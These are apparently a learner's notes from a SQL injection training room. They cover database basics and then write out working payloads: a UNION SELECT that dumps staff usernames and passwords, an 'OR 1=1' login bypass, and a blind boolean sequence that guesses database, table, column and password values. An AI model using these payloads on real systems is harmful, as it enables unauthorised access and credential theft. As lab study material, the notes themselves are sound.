...
A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for  Database Management System. DBMSs fall into two camps: **Relational and Non-Relational**; the focus of this room will be on Relational databases; some common ones you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. 
![Database structe](Database-structrue.png)
...
SQL queries are used to interact with databases. The **SELECT** statement retrieves data from a table, while clauses like **WHERE**, **LIMIT**, and **LIKE** help filter results. Other commands such as **INSERT**, **UPDATE**, and **DELETE** are used to modify data, and **UNION** combines results from multiple queries.
### SELECT
...
### Answer the questions below
![Task5-firststep](Task5-firststep.png)

*use ' confirms the existence of an SQL Injection vulnerability.*

![Task5-secondstep](Task5-secondstep.png)

*0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users*

![Task5-3step](Task5-3step.png)
...
add username whatever like admin
password : OR 1=1;(before the 'O' have a space)

![Task6-1step](Task6-1step.png)
...
***confirm column number-->guess database name-->find(guess) table name-->guess column name -->guess usernmae-->find password***

**admin123' UNION SELECT 1,2,3;-- (admin is ok but not stable)**

column number is 3

***admin123' OR database() like 'sqli_three';--***

database name is sqli_three

***admin123' OR EXISTS( SELECT * FROM information_schema.tables  WHERE table_schema='sqli_three'  AND table_name like 'users' );--***

***admin123' OR EXISTS(SELECT * FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name like 'u%'
);--***     (user password id)

***admin123' OR EXISTS(SELECT * FROM users WHERE username like 'a%');--***
(admin)

*admin123' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password like '3%');--*   3845
